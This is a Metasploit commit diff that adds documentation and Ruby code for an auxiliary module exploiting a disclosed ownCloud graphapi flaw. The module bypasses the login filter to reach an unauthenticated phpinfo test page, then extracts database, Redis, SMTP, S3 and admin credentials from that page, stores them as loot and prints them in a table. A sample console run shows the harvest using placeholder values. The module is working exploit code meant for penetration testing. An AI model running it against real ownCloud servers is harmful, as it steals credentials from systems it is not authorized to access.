befc87f9f026f178b2b47ac9101a43cd07aaea6b
h00die <michaeltcyr@gmail.com>
2023-12-03 15:45:44 -0500

    owncloud exploit

--- documentation/modules/auxiliary/gather/owncloud_phpinfo_reader.md
+++ documentation/modules/auxiliary/gather/owncloud_phpinfo_reader.md
@@ -1,5 +1,9 @@
 ## Vulnerable Application
 
+Docker containers of ownCloud compiled after February 2023, which have version 0.2.0 before 0.2.1 or 0.3.0 before 0.3.1 of the app `graph` installed
+contain a test file which prints `phpinfo()` to an unauthenticated user. A post file name must be appended to the URL to bypass the login filter.
+Docker may export sensitive environment variables including ownCloud, DB, redis, SMTP, and S3 credentials, as well as other host information.
+
 ### Docker-Compose Build
 
 Using docker-compose we can build a fairly robust system with plenty of information to pilfer.
@@ -78,37 +82,81 @@ services:
 
 You may need to add an aditional entry to `OWNCLOUD_TRUSTED_DOMAINS` which has the IP address of the host, such as `OWNCLOUD_TRUSTED_DOMAINS=localhost,192.68.1.1`
 
-## Verification Steps
-Example steps in this format (is also in the PR):
+If the `graph` app needs to be installed, use the following instructions:
 
-1. Install the application
+```
+docker exec -it owncloud /bin/bash
+cd apps
+wget "$(curl 'https://marketplace.owncloud.com/ajax/apps/graphapi/0.3.0' | sed 's/\\//g' | cut -d '"' -f 4)" -O graphapi-0.3.0.tar.gz
+rm -rf graphapi
+tar -zxf graphapi-0.3.0.tar.gz
+occ app:enable graphapi
+```
+
+## Verification Steps
+
+1. Install the application and plugin
 1. Start msfconsole
-1. Do: `use [module path]`
+1. Do: `use auxiliary/gather/owncloud_phpinfo_reader`
+1. Do: `set rhost [ip]`
 1. Do: `run`
-1. You should get a shell.
+1. You should information from the system configuration
 
 ## Options
-List each option and how to use it.
 
-### Option Name
+### ROOT
 
-Talk about what it does, and how to use it appropriately. If the default value is likely to change, include the default value here.
+Root path of the URI, which is different than `TARGETURI` as its ownCloud specific. Defaults to `all` which will try `''` (empty), and `owncloud`
+
+### ENDFILE
+
+The file path to add to the end of hte URL, which is used to bypass filtering. Defaults to `all` which will try `/.css`, `/.js`, `/.svg`,
+`/.gif`, `/.png`, `/.html`, `/.ttf`, `/.woff`, `/.ico`, `/.jpg`, `/.jpeg`, `/.json`, `/.properties`, `/.min.map`, `/.js.map`, `/.auto.map`
 
 ## Scenarios
-Specific demo of using the module that might be useful in a real world scenario.
 
-### Version and OS
-
-```
-code or console output
-```
-
-For example:
-
-To do this specific thing, here's how you do it:
+### ownCloud 10.12.1 from Docker Compose
 
 ```
-msf > use module_name
-msf auxiliary(module_name) > set POWERLEVEL >9000
-msf auxiliary(module_name) > exploit
+resource (owncloud.rb)> use auxiliary/gather/owncloud_phpinfo_reader
+resource (owncloud.rb)> set rhosts 127.0.0.1
+rhosts => 127.0.0.1
+resource (owncloud.rb)> set verbose true
+verbose => true
+resource (owncloud.rb)> run
+[*] Running module against 127.0.0.1
+[*] Checking: /apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/.css
+[+] Found phpinfo page at: /apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/.css
+[+] Loot stored to: /home/h00die/.msf4/loot/20231203153109_default_127.0.0.1_owncloud.phpinfo_453632.txt
+[+] License Key: 1122333
+[+] Hostname: b2b16d6f3ba6
+[+] Home: /root
+[+] Server Root: /var/www/owncloud
+[+] PWD: /var/www/owncloud
+[+] SMTP Username: smtp_username
+[+] SMTP Password: smtp_password
+[+] ownCloud Username: admin_username
+[+] ownCloud Password: admin_password
+[+] DB Host: mariadb:3306
+[+] DB Username: owncloud
+[+] DB Password: owncloud
+[+] DB Name: owncloud
+[+] Redis Host: redis
+[+] Redis Port: 6379
+[+] Objectstore Endpoint: https://s3.us-east-1.amazonaws.com
+[+] Objectstore Region: us-east-1
+[+] Objectsore Secret: secret123456
+[+] Objectstore Key: owncloud123456
+[+] Objectstore Bucket: owncloud
+[+] Credentials
+===========
+
+  Type             Host            Username             Password              Notes
+  ----             ----            --------             --------              -----
+  S3 Object Store  us-east-1       Key: owncloud123456  Secret: secret123456  Endpoint: https://s3.us-east-1.amazonaws.com, Bucket: owncloud
+  SMTP             127.0.0.1:25    smtp_username        smtp_password
+  mysql            127.0.0.1:8080  owncloud             owncloud
+  ownCloud         127.0.0.1:8080  admin_username       admin_password
+
+[*] Auxiliary module execution completed
 ```
--- modules/auxiliary/gather/owncloud_phpinfo_reader.rb
+++ modules/auxiliary/gather/owncloud_phpinfo_reader.rb
@@ -13,15 +13,17 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'ownCloud Phpinfo Reader',
         'Description' => %q{
-          This exploit module illustrates how a vulnerability could be exploited
-          in a webapp.
+          Docker containers of ownCloud compiled after February 2023, which have version 0.2.0 before 0.2.1 or 0.3.0 before 0.3.1 of the app `graph` installed
+          contain a test file which prints `phpinfo()` to an unauthenticated user. A post file name must be appended to the URL to bypass the login filter.
+          Docker may export sensitive environment variables including ownCloud, DB, redis, SMTP, and S3 credentials, as well as other host information.
         },
         'License' => MSF_LICENSE,
         'Author' => [
           'h00die', # msf module
           'creacitysec', # original PoC
           'Ron Bowes', # research
-          'random-robbie' # additional PoC work and research
+          'random-robbie', # additional PoC work and research
+          'Christian Fischer' # additional PoC work and research
         ],
         'References' => [
           [ 'URL', 'https://owncloud.com/security-advisories/disclosure-of-sensitive-credentials-and-configuration-in-containerized-deployments/'],
@@ -33,7 +35,12 @@ class MetasploitModule < Msf::Auxiliary
         'Targets' => [
           [ 'Automatic Target', {}]
         ],
-        'DisclosureDate' => '2023-11-21'
+        'DisclosureDate' => '2023-11-21',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [IOC_IN_LOGS],
+          'SideEffects' => []
+        }
       )
     )
     register_options(
@@ -74,7 +81,10 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
+    found = false
     roots.each do |root|
+      break if found
+
       endfiles.each do |endfile|
         url = normalize_uri(target_uri.path, root, 'apps', 'graphapi', 'vendor', 'microsoft', 'microsoft-graph', 'tests', 'GetPhpInfo.php', endfile)
         vprint_status("Checking: #{url}")
@@ -103,6 +113,27 @@ class MetasploitModule < Msf::Auxiliary
 
         ## License Key
         print_good("License Key: #{::Regexp.last_match(1)}") if res.body =~ /#{field_regex('OWNCLOUD_LICENSE_KEY')}/
+
+        ## Misc host things
+        if res.body =~ /#{field_regex('HOSTNAME')}/
+          print_good("Hostname: #{::Regexp.last_match(1)}")
+        end
+        if res.body =~ /#{field_regex('HOME')}/
+          print_good("Home: #{::Regexp.last_match(1)}")
+        end
+        if res.body =~ /#{field_regex('APACHE_DOCUMENT_ROOT')}/
+          print_good("Server Root: #{::Regexp.last_match(1)}")
+        end
+        if res.body =~ /#{field_regex('PWD')}/
+          print_good("PWD: #{::Regexp.last_match(1)}")
+        end
+
+        table = Rex::Text::Table.new(
+          'Header' => 'Credentials',
+          'Indent' => 2,
+          'SortIndex' => 0,
+          'Columns' => [ 'Type', 'Host', 'Username', 'Password', 'Notes']
+        )
 
         ## SMTP
         if res.body =~ /#{field_regex('OWNCLOUD_MAIL_SMTP_HOST')}/
@@ -139,6 +170,7 @@ class MetasploitModule < Msf::Auxiliary
           credential_data[:port] = smtp_port.nil? ? 25 : smtp_port
 
           create_credential(credential_data)
+          table << ['SMTP', "#{credential_data[:address]}:#{credential_data[:port]}", credential_data[:username], smtp_password, '']
         end
 
         ## ownCloud
@@ -169,12 +201,114 @@ class MetasploitModule < Msf::Auxiliary
             private_data: owncloud_password,
             private_type: :password
           }
-          credential_data[:username] = owncloud_username if owncloud_username
+          credential_data[:username] = owncloud_username.nil? ? '' : owncloud_username
 
           create_credential(credential_data)
+          table << ['ownCloud', "#{rhost}:#{rport}", credential_data[:username], owncloud_password, '']
         end
 
-        return # no need to keep going, we already got what we wanted
+        ## DB
+        if res.body =~ /#{field_regex('OWNCLOUD_DB_HOST')}/ # includes port
+          db_host = ::Regexp.last_match(1)
+          print_good("DB Host: #{::Regexp.last_match(1)}")
+        end
+        if res.body =~ /#{field_regex('OWNCLOUD_DB_USERNAME')}/
+          db_username = ::Regexp.last_match(1)
+          print_good("DB Username: #{::Regexp.last_match(1)}")
+        end
+        if res.body =~ /#{field_regex('OWNCLOUD_DB_PASSWORD')}/
+          db_password = ::Regexp.last_match(1)
+          print_good("DB Password: #{::Regexp.last_match(1)}")
+        end
+        if res.body =~ /#{field_regex('OWNCLOUD_DB_NAME')}/
+          print_good("DB Name: #{::Regexp.last_match(1)}")
+        end
+        if res.body =~ /#{field_regex('OWNCLOUD_DB_TYPE')}/
+          db_type = ::Regexp.last_match(1)
+        end
+
+        if db_password
+          credential_data = {
+            protocol: 'tcp',
+            port: db_host.split(':')[1],
+            address: db_host.split(':')[0],
+            workspace_id: myworkspace_id,
+            service_name: db_type,
+            origin_type: :service,
+            module_fullname: fullname,
+            status: Metasploit::Model::Login::Status::UNTRIED,
+            private_data: db_password,
+            private_type: :password
+          }
+          credential_data[:username] = db_username.nil? ? '' : db_username
+          create_credential(credential_data)
+          table << [db_type, "#{rhost}:#{rport}", credential_data[:username], db_password, '']
+        end
+
+        ## REDIS
+        if res.body =~ /#{field_regex('OWNCLOUD_REDIS_HOST')}/
+          redis_host = ::Regexp.last_match(1)
+          print_good("Redis Host: #{::Regexp.last_match(1)}")
+        end
+        if res.body =~ /#{field_regex('OWNCLOUD_REDIS_PORT')}/
+          redis_port = ::Regexp.last_match(1)
+          print_good("Redis Port: #{::Regexp.last_match(1)}")
+        end
+        if res.body =~ /#{field_regex('OWNCLOUD_REDIS_DB')}/
+          ::Regexp.last_match(1)
+          print_good("Redis DB: #{::Regexp.last_match(1)}")
+        end
+        if res.body =~ /#{field_regex('OWNCLOUD_REDIS_PASSWORD')}/
+          redis_password = ::Regexp.last_match(1)
+          print_good("Redis Password: #{::Regexp.last_match(1)}")
+        end
+
+        if redis_password
+          credential_data = {
+            protocol: 'tcp',
+            port: redis_port,
+            address: redis_host,
+            workspace_id: myworkspace_id,
+            service_name: 'redis',
+            origin_type: :service,
+            module_fullname: fullname,
+            status: Metasploit::Model::Login::Status::UNTRIED,
+            private_data: redis_password,
+            private_type: :password
+          }
+
+          create_credential(credential_data)
+          table << ['redis', "#{redis_host}:#{redis_port}", '', redis_password, '']
+        end
+
+        ## OBJECTSTORE
+        if res.body =~ /#{field_regex('OWNCLOUD_OBJECTSTORE_ENDPOINT')}/
+          os_endpoint = ::Regexp.last_match(1)
+          print_good("Objectstore Endpoint: #{::Regexp.last_match(1)}")
+        end
+        if res.body =~ /#{field_regex('OWNCLOUD_OBJECTSTORE_REGION')}/
+          os_region = ::Regexp.last_match(1)
+          print_good("Objectstore Region: #{::Regexp.last_match(1)}")
+        end
+        if res.body =~ /#{field_regex('OWNCLOUD_OBJECTSTORE_SECRET')}/
+          os_secret = ::Regexp.last_match(1)
+          print_good("Objectsore Secret: #{::Regexp.last_match(1)}")
+        end
+        if res.body =~ /#{field_regex('OWNCLOUD_OBJECTSTORE_KEY')}/
+          os_key = ::Regexp.last_match(1)
+          print_good("Objectstore Key: #{::Regexp.last_match(1)}")
+        end
+        if res.body =~ /#{field_regex('OWNCLOUD_OBJECTSTORE_BUCKET')}/
+          os_bucket = ::Regexp.last_match(1)
+          print_good("Objectstore Bucket: #{::Regexp.last_match(1)}")
+        end
+        if os_secret && os_key
+          table << ['S3 Object Store', os_region, "Key: #{os_key}", "Secret: #{os_secret}", "Endpoint: #{os_endpoint}, Bucket: #{os_bucket}"]
+        end
+
+        print_good(table.to_s)
+        found = true
+        break # no need to keep going, we already got what we wanted
       end
     end
   end
